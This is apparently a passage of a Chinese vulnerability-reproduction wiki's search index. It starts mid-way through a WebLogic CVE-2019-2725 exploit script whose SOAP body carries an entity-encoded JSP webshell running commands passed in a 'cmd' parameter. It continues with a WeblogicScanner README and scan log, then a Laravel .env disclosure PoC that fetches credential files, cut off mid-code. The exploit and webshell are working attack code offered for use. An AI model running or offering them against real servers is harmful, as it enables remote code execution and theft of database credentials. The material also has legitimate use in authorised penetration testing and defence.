<string>&#x3c;&#x25;&#x40;&#x20;&#x70;&#x61;&#x67;&#x65;&#x20;&#x6c;&#x61;&#x6e;&#x67;&#x75;&#x61;&#x67;&#x65;&#x3d;&#x22;&#x6a;&#x61;&#x76;&#x61;&#x22;&#x20;&#x63;&#x6f;&#x6e;&#x74;&#x65;&#x6e;&#x74;&#x54;&#x79;&#x70;&#x65;&#x3d;&#x22;&#x74;&#x65;&#x78;&#x74;&#x2f;&#x68;&#x74;&#x6d;&#x6c;&#x3b;&#x20;&#x63;&#x68;&#x61;&#x72;&#x73;&#x65;&#x74;&#x3d;&#x47;&#x42;&#x4b;&#x22;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x70;&#x61;&#x67;&#x65;&#x45;&#x6e;&#x63;&#x6f;&#x64;&#x69;&#x6e;&#x67;&#x3d;&#x22;&#x55;&#x54;&#x46;&#x2d;&#x38;&#x22;&#x25;&#x3e;&#x0a;&#x3c;&#x21;&#x44;&#x4f;&#x43;&#x54;&#x59;&#x50;&#x45;&#x20;&#x68;&#x74;&#x6d;&#x6c;&#x20;&#x50;&#x55;&#x42;&#x4c;&#x49;&#x43;&#x20;&#x22;&#x2d;&#x2f;&#x2f;&#x57;&#x33;&#x43;&#x2f;&#x2f;&#x44;&#x54;&#x44;&#x20;&#x48;&#x54;&#x4d;&#x4c;&#x20;&#x34;&#x2e;&#x30;&#x31;&#x20;&#x54;&#x72;&#x61;&#x6e;&#x73;&#x69;&#x74;&#x69;&#x6f;&#x6e;&#x61;&#x6c;&#x2f;&#x2f;&#x45;&#x4e;&#x22;&#x20;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x77;&#x77;&#x77;&#x2e;&#x77;&#x33;&#x2e;&#x6f;&#x72;&#x67;&#x2f;&#x54;&#x52;&#x2f;&#x68;&#x74;&#x6d;&#x6c;&#x34;&#x2f;&#x6c;&#x6f;&#x6f;&#x73;&#x65;&#x2e;&#x64;&#x74;&#x64;&#x22;&#x3e;&#x0a;&#x3c;&#x68;&#x74;&#x6d;&#x6c;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x62;&#x6f;&#x64;&#x79;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x25;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x69;&#x66;&#x20;&#x28;&#x22;&#x61;&#x64;&#x6d;&#x69;&#x6e;&#x22;&#x2e;&#x65;&#x71;&#x75;&#x61;&#x6c;&#x73;&#x28;&#x72;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x2e;&#x67;&#x65;&#x74;&#x50;&#x61;&#x72;&#x61;&#x6d;&#x65;&#x74;&#x65;&#x72;&#x28;&#x22;&#x70;&#x77;&#x64;&#x22;&#x29;&#x29;&#x29;&#x20;&#x7b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x69;&#x6f;&#x2e;&#x49;&#x6e;&#x70;&#x75;&#x74;&#x53;&#x74;&#x72;&#x65;&#x61;&#x6d;&#x20;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x20;&#x3d;&#x20;&#x52;&#x75;&#x6e;&#x74;&#x69;&#x6d;&#x65;&#x2e;&#x67;&#x65;&#x74;&#x52;&#x75;&#x6e;&#x74;&#x69;&#x6d;&#x65;&#x28;&#x29;&#x2e;&#x65;&#x78;&#x65;&#x63;&#x28;&#x72;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x2e;&#x67;&#x65;&#x74;&#x50;&#x61;&#x72;&#x61;&#x6d;&#x65;&#x74;&#x65;&#x72;&#x28;&#x22;&#x63;&#x6d;&#x64;&#x22;&#x29;&#x29;&#x2e;&#x67;&#x65;&#x74;&#x49;&#x6e;&#x70;&#x75;&#x74;&#x53;&#x74;&#x72;&#x65;&#x61;&#x6d;&#x28;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x69;&#x6e;&#x74;&#x20;&#x6c;&#x65;&#x6e;&#x20;&#x3d;&#x20;&#x2d;&#x31;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x62;&#x79;&#x74;&#x65;&#x5b;&#x5d;&#x20;&#x62;&#x79;&#x74;&#x65;&#x73;&#x20;&#x3d;&#x20;&#x6e;&#x65;&#x77;&#x20;&#x62;&#x79;&#x74;&#x65;&#x5b;&#x34;&#x30;&#x39;&#x32;&#x5d;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x6f;&#x75;&#x74;&#x2e;&#x70;&#x72;&#x69;&#x6e;&#x74;&#x28;&#x22;&#x3c;&#x70;&#x72;&#x65;&#x3e;&#x22;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x77;&#x68;&#x69;&#x6c;&#x65;&#x20;&#x28;&#x28;&#x6c;&#x65;&#x6e;&#x20;&#x3d;&#x20;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x2e;&#x72;&#x65;&#x61;&#x64;&#x28;&#x62;&#x79;&#x74;&#x65;&#x73;&#x29;&#x29;&#x20;&#x21;&#x3d;&#x20;&#x2d;&#x31;&#x29;&#x20;&#x7b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x6f;&#x75;&#x74;&#x2e;&#x70;&#x72;&#x69;&#x6e;&#x74;&#x6c;&#x6e;&#x28;&#x6e;&#x65;&#x77;&#x20;&#x53;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x62;&#x79;&#x74;&#x65;&#x73;&#x2c;&#x20;&#x22;&#x47;&#x42;&#x4b;&#x22;&#x29;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x7d;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x6f;&#x75;&#x74;&#x2e;&#x70;&#x72;&#x69;&#x6e;&#x74;&#x28;&#x22;&#x3c;&#x2f;&#x70;&#x72;&#x65;&#x3e;&#x22;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x7d;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x25;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x62;&#x6f;&#x64;&#x79;&#x3e;&#x0a;&#x0a;&#x3c;&#x2f;&#x68;&#x74;&#x6d;&#x6c;&#x3e;</string> </void> <void method=\"close\"/> </object> </java>]]></string></void></class> </work:WorkContext> </soapenv:Header> <soapenv:Body></soapenv:Body></soapenv:Envelope>''' url = \" %s /wls-wsat/CoordinatorPortType\" % ( ip ) rsp = requests . post ( url , data = body , verify = False , headers = headers ) logger . info ( \" \\r\\n Shell\u5730\u5740\uff1a %s /bea_wls_internal/demo.jsp?pwd=admin&cmd=ipconfig\" % ( ip )) if __name__ == '__main__' : info = '''\u547d\u4ee4\u6267\u884c\uff1a python weblogic-2019-2725.py 10.3.6 http//:127.0.0.1:7001 cmd python weblogic-2019-2725.py 12.1.3 http//:127.0.0.1:7001 cmd \u4e0a\u4f20webshell python weblogic-2019-2725.py 10.3.6 http//:ip:port python weblogic-2019-2725.py 12.1.3 http//:ip:port ''' print ( info ) if len ( sys . argv ) == 3 : if sys . argv [ 1 ] == \"10.3.6\" : webshell_10_3_6 ( sys . argv [ 2 ]) elif sys . argv [ 1 ] == \"12.1.3\" : webshell_12_1_3 ( sys . argv [ 2 ]) else : logger . error ( \"\u53c2\u6570\u4f20\u5165\u9519\u8bef\" ) elif len ( sys . argv ) == 4 : if sys . argv [ 1 ] == \"10.3.6\" : weblogic_10_3_6 ( sys . argv [ 2 ], sys . argv [ 3 ]) elif sys . argv [ 1 ] == \"12.1.3\" : weblogic_12_1_3 ( sys . argv [ 2 ], sys . argv [ 3 ]) else : logger . error ( \"\u53c2\u6570\u4f20\u5165\u9519\u8bef\" ) else : logger . error ( \"\u53c2\u6570\u4f20\u5165\u9519\u8bef\" )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Weblogic/Scan/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%20WeblogicScanner/","text":"WeblogicScanner \u6f0f\u6d1e\u626b\u63cf \u00b6 \u6e90\u5de5\u5177\u94fe\u63a5\uff1a https://github.com/rabbitmask/WeblogicScan weblogicScaner \u00b6 \u622a\u81f3 2020 \u5e74 11 \u6708 27 \u65e5\uff0cweblogic \u6f0f\u6d1e\u626b\u63cf\u5de5\u5177\u3002\u82e5\u5b58\u5728\u672a\u8bb0\u5f55\u4e14\u5df2\u516c\u5f00 POC \u7684\u6f0f\u6d1e\uff0c\u6b22\u8fce\u63d0\u4ea4 issue\u3002 \u539f\u4f5c\u8005\u5df2\u7ecf\u6536\u96c6\u5f97\u6bd4\u8f83\u5b8c\u6574\u4e86\uff0c\u5728\u8fd9\u91cc\u505a\u4e86\u90e8\u5206\u7684 bug \u4fee\u590d\uff0c\u90e8\u5206\u811a\u672c POC \u672a\u751f\u6548\uff0c\u914d\u7f6e\u9519\u8bef\u7b49\u95ee\u9898\u3002\u4e4b\u524d\u67e5\u4e86\u4e00\u4e0b\u53d1\u73b0\u90e8\u5206 POC \u65e0\u6cd5\u4f7f\u7528\u3002\u5728\u8fd9\u4e2a\u9879\u76ee\u91cc\u9762\u5bf9\u811a\u672c\u505a\u4e86\u4e00\u4e9b\u4fee\u6539\uff0c\u63d0\u9ad8\u51c6\u786e\u7387\u3002 \u6ce8\u610f \uff1a\u90e8\u5206\u6f0f\u6d1e\u7531\u4e8e\u7a33\u5b9a\u6027\u539f\u56e0\u9700\u8981\u591a\u6b21\u6d4b\u8bd5\u624d\u53ef\u9a8c\u8bc1 \u76ee\u524d\u53ef\u68c0\u6d4b\u6f0f\u6d1e\u7f16\u53f7\u6709\uff08\u90e8\u5206\u975e\u539f\u7406\u68c0\u6d4b\uff0c\u9700\u624b\u52a8\u9a8c\u8bc1\uff09\uff1a weblogic administrator console CVE-2014-4210 CVE-2016-0638 CVE-2016-3510 CVE-2017-3248 CVE-2017-3506 CVE-2017-10271 CVE-2018-2628 CVE-2018-2893 CVE-2018-2894 CVE-2018-3191 CVE-2018-3245 CVE-2018-3252 CVE-2019-2618 CVE-2019-2725 CVE-2019-2729 CVE-2019-2890 CVE-2020-2551 CVE-2020-14882 CVE-2020-14883 \u5feb\u901f\u5f00\u59cb \u00b6 \u4f9d\u8d56 \u00b6 python >= 3.6 \u8fdb\u5165\u9879\u76ee\u76ee\u5f55\uff0c\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u5b89\u88c5\u4f9d\u8d56\u5e93 $ pip3 install requests \u4f7f\u7528\u8bf4\u660e \u00b6 usage: ws.py [-h] -t TARGETS [TARGETS ...] -v VULNERABILITY [VULNERABILITY ...] [-o OUTPUT] optional arguments: -h, --help \u5e2e\u52a9\u4fe1\u606f -t TARGETS [TARGETS ...], --targets TARGETS [TARGETS ...] \u76f4\u63a5\u586b\u5165\u76ee\u6807\u6216\u6587\u4ef6\u5217\u8868\uff08\u9ed8\u8ba4\u4f7f\u7528\u7aef\u53e37001\uff09. \u4f8b\u5b50\uff1a 127.0.0.1:7001 -v VULNERABILITY [VULNERABILITY ...], --vulnerability VULNERABILITY [VULNERABILITY ...] \u6f0f\u6d1e\u540d\u79f0\u6216CVE\u7f16\u53f7\uff0c\u4f8b\u5b50\uff1a\"weblogic administrator console\" -o OUTPUT, --output OUTPUT \u8f93\u51fa json \u7ed3\u679c\u7684\u8def\u5f84\u3002\u9ed8\u8ba4\u4e0d\u8f93\u51fa\u7ed3\u679c -s, --ssl \u5f3a\u5236\u4f7f\u7528 https \u534f\u8bae\u8bf7\u6c42 \u7ed3\u679c\u6837\u4f8b \u00b6 (venv) ~/weblogicScanner$ python ws.py -t 192.168.124.129 [23:03:04][INFO] [*][Weblogic Console][192.168.56.129:7001] Start... [23:03:04][INFO] [+][Weblogic Console][192.168.56.129:7001] Found module! [23:03:04][INFO] [*][Weblogic Console][192.168.56.129:7001] Please verify manually! [23:03:04][INFO] [*][CVE-2014-4210][192.168.56.129:7001] Start... [23:03:04][INFO] [-][CVE-2014-4210][192.168.56.129:7001] Not found. [23:03:04][INFO] [*][CVE-2016-0638][192.168.56.129:7001] Start... [23:03:06][INFO] [-][CVE-2016-0638][192.168.56.129:7001] Not vulnerability. [23:03:06][INFO] [*][CVE-2016-3510][192.168.56.129:7001] Start... [23:03:08][INFO] [-][CVE-2016-3510][192.168.56.129:7001] Not vulnerability. [23:03:08][INFO] [*][CVE-2017-3248][192.168.56.129:7001] Start... [23:03:10][INFO] [-][CVE-2017-3248][192.168.56.129:7001] Not vulnerability. [23:03:10][INFO] [*][CVE-2017-3506][192.168.56.129:7001] Start... [23:03:10][INFO] [-][CVE-2017-3506][192.168.56.129:7001] Not vulnerability. [23:03:10][INFO] [*][CVE-2017-10271][192.168.56.129:7001] Start... [23:03:10][INFO] [-][CVE-2017-10271][192.168.56.129:7001] Not vulnerability. [23:03:10][INFO] [*][CVE-2018-2628][192.168.56.129:7001] Start... [23:03:14][INFO] [+][CVE-2018-2628][192.168.56.129:7001] Exists vulnerability! [23:03:14][INFO] [*][CVE-2018-2893][192.168.56.129:7001] Start... [23:03:18][INFO] [+][CVE-2018-2893][192.168.56.129:7001] Exists vulnerability! [23:03:18][INFO] [*][CVE-2018-2894][192.168.56.129:7001] Start... [23:03:19][INFO] [+][CVE-2018-2894][192.168.56.129:7001] Found module! [23:03:19][INFO] [*][CVE-2018-2894][192.168.56.129:7001] Please verify manually! [23:03:19][INFO] [*][CVE-2018-3191][192.168.56.129:7001] Start... [23:03:23][INFO] [+][CVE-2018-3191][192.168.56.129:7001] Exists vulnerability! [23:03:23][INFO] [*][CVE-2018-3245][192.168.56.129:7001] Start... [23:03:29][INFO] [-][CVE-2018-3245][192.168.56.129:7001] Not vulnerability. [23:03:29][INFO] [*][CVE-2018-3252][192.168.56.129:7001] Start... [23:03:36][INFO] [+][CVE-2018-3252][192.168.56.129:7001] Found module! [23:03:36][INFO] [*][CVE-2018-3252][192.168.56.129:7001] Please verify manually! [23:03:36][INFO] [*][CVE-2019-2618][192.168.56.129:7001] Start... [23:03:36][INFO] [+][CVE-2019-2618][192.168.56.129:7001] Found module! [23:03:36][INFO] [*][CVE-2019-2618][192.168.56.129:7001] Please verify manually! [23:03:36][INFO] [*][CVE-2019-2725][192.168.56.129:7001] Start... [23:03:46][INFO] [-][CVE-2019-2725][192.168.56.129:7001] Not vulnerability. [23:03:46][INFO] [*][CVE-2019-2729][192.168.56.129:7001] Start... [23:03:54][INFO] [-][CVE-2019-2729][192.168.56.129:7001] Not vulnerability. [23:03:54][INFO] [*][CVE-2019-2888][192.168.56.129:7001] Start... [23:03:56][INFO] [+][CVE-2019-2888][192.168.56.129:7001] Found module! [23:03:56][INFO] [*][CVE-2019-2888][192.168.56.129:7001] Please verify manually! [23:03:56][INFO] [*][CVE-2019-2890][192.168.56.129:7001] Start... [23:03:58][INFO] [-][CVE-2019-2890][192.168.56.129:7001] Not vulnerability. [23:03:58][INFO] [*][CVE-2020-2551][192.168.56.129:7001] Start... [23:03:58][INFO] [+][CVE-2020-2551][192.168.56.129:7001] Found module! [23:03:58][INFO] [*][CVE-2020-2551][192.168.56.129:7001] Please verify manually! [23:03:58][INFO] [*][CVE-2020-2555][192.168.56.129:7001] Start... [23:04:02][INFO] [+][CVE-2020-2555][192.168.56.129:7001] Exists vulnerability! [23:04:02][INFO] [*][CVE-2020-2883][192.168.56.129:7001] Start... [23:04:06][INFO] [+][CVE-2020-2883][192.168.56.129:7001] Exists vulnerability! [23:04:06][INFO] [*][CVE-2020-14882][192.168.56.129:7001] Start... [23:04:23][INFO] [-][CVE-2020-14882][192.168.56.129:7001] Not vulnerability. [23:04:23][INFO] [*][CVE-2020-14883][192.168.56.129:7001] Start... [23:04:23][INFO] [+][CVE-2020-14883][192.168.56.129:7001] Exists vulnerability!","title":"\u626b\u63cf\u5de5\u5177 WeblogicScanner"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Weblogic/Scan/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%20WeblogicScanner/#weblogicscanner-\u6f0f\u6d1e\u626b\u63cf","text":"\u6e90\u5de5\u5177\u94fe\u63a5\uff1a https://github.com/rabbitmask/WeblogicScan","title":"WeblogicScanner \u6f0f\u6d1e\u626b\u63cf"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Weblogic/Scan/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%20WeblogicScanner/#weblogicscaner","text":"\u622a\u81f3 2020 \u5e74 11 \u6708 27 \u65e5\uff0cweblogic \u6f0f\u6d1e\u626b\u63cf\u5de5\u5177\u3002\u82e5\u5b58\u5728\u672a\u8bb0\u5f55\u4e14\u5df2\u516c\u5f00 POC \u7684\u6f0f\u6d1e\uff0c\u6b22\u8fce\u63d0\u4ea4 issue\u3002 \u539f\u4f5c\u8005\u5df2\u7ecf\u6536\u96c6\u5f97\u6bd4\u8f83\u5b8c\u6574\u4e86\uff0c\u5728\u8fd9\u91cc\u505a\u4e86\u90e8\u5206\u7684 bug \u4fee\u590d\uff0c\u90e8\u5206\u811a\u672c POC \u672a\u751f\u6548\uff0c\u914d\u7f6e\u9519\u8bef\u7b49\u95ee\u9898\u3002\u4e4b\u524d\u67e5\u4e86\u4e00\u4e0b\u53d1\u73b0\u90e8\u5206 POC \u65e0\u6cd5\u4f7f\u7528\u3002\u5728\u8fd9\u4e2a\u9879\u76ee\u91cc\u9762\u5bf9\u811a\u672c\u505a\u4e86\u4e00\u4e9b\u4fee\u6539\uff0c\u63d0\u9ad8\u51c6\u786e\u7387\u3002 \u6ce8\u610f \uff1a\u90e8\u5206\u6f0f\u6d1e\u7531\u4e8e\u7a33\u5b9a\u6027\u539f\u56e0\u9700\u8981\u591a\u6b21\u6d4b\u8bd5\u624d\u53ef\u9a8c\u8bc1 \u76ee\u524d\u53ef\u68c0\u6d4b\u6f0f\u6d1e\u7f16\u53f7\u6709\uff08\u90e8\u5206\u975e\u539f\u7406\u68c0\u6d4b\uff0c\u9700\u624b\u52a8\u9a8c\u8bc1\uff09\uff1a weblogic administrator console CVE-2014-4210 CVE-2016-0638 CVE-2016-3510 CVE-2017-3248 CVE-2017-3506 CVE-2017-10271 CVE-2018-2628 CVE-2018-2893 CVE-2018-2894 CVE-2018-3191 CVE-2018-3245 CVE-2018-3252 CVE-2019-2618 CVE-2019-2725 CVE-2019-2729 CVE-2019-2890 CVE-2020-2551 CVE-2020-14882 CVE-2020-14883","title":"weblogicScaner"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Weblogic/Scan/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%20WeblogicScanner/#\u5feb\u901f\u5f00\u59cb","text":"","title":"\u5feb\u901f\u5f00\u59cb"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Weblogic/Scan/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%20WeblogicScanner/#\u4f9d\u8d56","text":"python >= 3.6 \u8fdb\u5165\u9879\u76ee\u76ee\u5f55\uff0c\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u5b89\u88c5\u4f9d\u8d56\u5e93 $ pip3 install requests","title":"\u4f9d\u8d56"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Weblogic/Scan/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%20WeblogicScanner/#\u4f7f\u7528\u8bf4\u660e","text":"usage: ws.py [-h] -t TARGETS [TARGETS ...] -v VULNERABILITY [VULNERABILITY ...] [-o OUTPUT] optional arguments: -h, --help \u5e2e\u52a9\u4fe1\u606f -t TARGETS [TARGETS ...], --targets TARGETS [TARGETS ...] \u76f4\u63a5\u586b\u5165\u76ee\u6807\u6216\u6587\u4ef6\u5217\u8868\uff08\u9ed8\u8ba4\u4f7f\u7528\u7aef\u53e37001\uff09. \u4f8b\u5b50\uff1a 127.0.0.1:7001 -v VULNERABILITY [VULNERABILITY ...], --vulnerability VULNERABILITY [VULNERABILITY ...] \u6f0f\u6d1e\u540d\u79f0\u6216CVE\u7f16\u53f7\uff0c\u4f8b\u5b50\uff1a\"weblogic administrator console\" -o OUTPUT, --output OUTPUT \u8f93\u51fa json \u7ed3\u679c\u7684\u8def\u5f84\u3002\u9ed8\u8ba4\u4e0d\u8f93\u51fa\u7ed3\u679c -s, --ssl \u5f3a\u5236\u4f7f\u7528 https \u534f\u8bae\u8bf7\u6c42","title":"\u4f7f\u7528\u8bf4\u660e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Weblogic/Scan/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%20WeblogicScanner/#\u7ed3\u679c\u6837\u4f8b","text":"(venv) ~/weblogicScanner$ python ws.py -t 192.168.124.129 [23:03:04][INFO] [*][Weblogic Console][192.168.56.129:7001] Start... [23:03:04][INFO] [+][Weblogic Console][192.168.56.129:7001] Found module! [23:03:04][INFO] [*][Weblogic Console][192.168.56.129:7001] Please verify manually! [23:03:04][INFO] [*][CVE-2014-4210][192.168.56.129:7001] Start... [23:03:04][INFO] [-][CVE-2014-4210][192.168.56.129:7001] Not found. [23:03:04][INFO] [*][CVE-2016-0638][192.168.56.129:7001] Start... [23:03:06][INFO] [-][CVE-2016-0638][192.168.56.129:7001] Not vulnerability. [23:03:06][INFO] [*][CVE-2016-3510][192.168.56.129:7001] Start... [23:03:08][INFO] [-][CVE-2016-3510][192.168.56.129:7001] Not vulnerability. [23:03:08][INFO] [*][CVE-2017-3248][192.168.56.129:7001] Start... [23:03:10][INFO] [-][CVE-2017-3248][192.168.56.129:7001] Not vulnerability. [23:03:10][INFO] [*][CVE-2017-3506][192.168.56.129:7001] Start... [23:03:10][INFO] [-][CVE-2017-3506][192.168.56.129:7001] Not vulnerability. [23:03:10][INFO] [*][CVE-2017-10271][192.168.56.129:7001] Start... [23:03:10][INFO] [-][CVE-2017-10271][192.168.56.129:7001] Not vulnerability. [23:03:10][INFO] [*][CVE-2018-2628][192.168.56.129:7001] Start... [23:03:14][INFO] [+][CVE-2018-2628][192.168.56.129:7001] Exists vulnerability! [23:03:14][INFO] [*][CVE-2018-2893][192.168.56.129:7001] Start... [23:03:18][INFO] [+][CVE-2018-2893][192.168.56.129:7001] Exists vulnerability! [23:03:18][INFO] [*][CVE-2018-2894][192.168.56.129:7001] Start... [23:03:19][INFO] [+][CVE-2018-2894][192.168.56.129:7001] Found module! [23:03:19][INFO] [*][CVE-2018-2894][192.168.56.129:7001] Please verify manually! [23:03:19][INFO] [*][CVE-2018-3191][192.168.56.129:7001] Start... [23:03:23][INFO] [+][CVE-2018-3191][192.168.56.129:7001] Exists vulnerability! [23:03:23][INFO] [*][CVE-2018-3245][192.168.56.129:7001] Start... [23:03:29][INFO] [-][CVE-2018-3245][192.168.56.129:7001] Not vulnerability. [23:03:29][INFO] [*][CVE-2018-3252][192.168.56.129:7001] Start... [23:03:36][INFO] [+][CVE-2018-3252][192.168.56.129:7001] Found module! [23:03:36][INFO] [*][CVE-2018-3252][192.168.56.129:7001] Please verify manually! [23:03:36][INFO] [*][CVE-2019-2618][192.168.56.129:7001] Start... [23:03:36][INFO] [+][CVE-2019-2618][192.168.56.129:7001] Found module! [23:03:36][INFO] [*][CVE-2019-2618][192.168.56.129:7001] Please verify manually! [23:03:36][INFO] [*][CVE-2019-2725][192.168.56.129:7001] Start... [23:03:46][INFO] [-][CVE-2019-2725][192.168.56.129:7001] Not vulnerability. [23:03:46][INFO] [*][CVE-2019-2729][192.168.56.129:7001] Start... [23:03:54][INFO] [-][CVE-2019-2729][192.168.56.129:7001] Not vulnerability. [23:03:54][INFO] [*][CVE-2019-2888][192.168.56.129:7001] Start... [23:03:56][INFO] [+][CVE-2019-2888][192.168.56.129:7001] Found module! [23:03:56][INFO] [*][CVE-2019-2888][192.168.56.129:7001] Please verify manually! [23:03:56][INFO] [*][CVE-2019-2890][192.168.56.129:7001] Start... [23:03:58][INFO] [-][CVE-2019-2890][192.168.56.129:7001] Not vulnerability. [23:03:58][INFO] [*][CVE-2020-2551][192.168.56.129:7001] Start... [23:03:58][INFO] [+][CVE-2020-2551][192.168.56.129:7001] Found module! [23:03:58][INFO] [*][CVE-2020-2551][192.168.56.129:7001] Please verify manually! [23:03:58][INFO] [*][CVE-2020-2555][192.168.56.129:7001] Start... [23:04:02][INFO] [+][CVE-2020-2555][192.168.56.129:7001] Exists vulnerability! [23:04:02][INFO] [*][CVE-2020-2883][192.168.56.129:7001] Start... [23:04:06][INFO] [+][CVE-2020-2883][192.168.56.129:7001] Exists vulnerability! [23:04:06][INFO] [*][CVE-2020-14882][192.168.56.129:7001] Start... [23:04:23][INFO] [-][CVE-2020-14882][192.168.56.129:7001] Not vulnerability. [23:04:23][INFO] [*][CVE-2020-14883][192.168.56.129:7001] Start... [23:04:23][INFO] [+][CVE-2020-14883][192.168.56.129:7001] Exists vulnerability!","title":"\u7ed3\u679c\u6837\u4f8b"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Laravel/Laravel%20.env%20%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%20CVE-2017-16894/","text":"Laravel .env \u914d\u7f6e\u6587\u4ef6\u6cc4\u9732 CVE-2017-16894 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 Laravel Framework\u662fTaylor Otwell\u8f6f\u4ef6\u5f00\u53d1\u8005\u5f00\u53d1\u7684\u4e00\u6b3e\u57fa\u4e8ePHP\u7684Web\u5e94\u7528\u7a0b\u5e8f\u5f00\u53d1\u6846\u67b6\u3002 Laravel framework 5.5.21\u53ca\u4e4b\u524d\u7684\u7248\u672c\u4e2d\u5b58\u5728 .env \u6587\u4ef6\u53ef\u88ab\u4e0b\u8f7d\u7684\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e\u3002\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u83b7\u53d6\u654f\u611f\u4fe1\u606f \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] Laravel framework <= 5.5.21 FOFA \u00b6 [!NOTE] app=\"Laravel-Framework\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u8bbf\u95ee\u76ee\u6807 url http://xxx.xxx.xxx.xxx/.env \u5f53\u914d\u7f6e\u4e0d\u5f53\u4e14\u5728\u5f71\u54cd\u8303\u56f4\u5185\u65f6\u4f1a\u51fa\u73b0 .env\u53ef\u88ab\u4e0b\u8f7d\u7684\u60c5\u51b5 \uff0c\u5bfc\u81f4\u6570\u636e\u5e93\u8d26\u53f7\u5bc6\u7801\u7b49\u654f\u611f\u4fe1\u606f\u7684\u6cc4\u9732 \u8fd9\u91cc\u4f7f\u7528POC\u811a\u672c\u6765\u8fdb\u884c\u4fe1\u606f\u83b7\u53d6 \u6f0f\u6d1e\u5229\u7528POC \u00b6 import requests import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mVersion: Laravel framework <= 5.5.21 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/.env\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) if \"APP_NAME\" in response . text : print ( \" \\033 [32m[o] 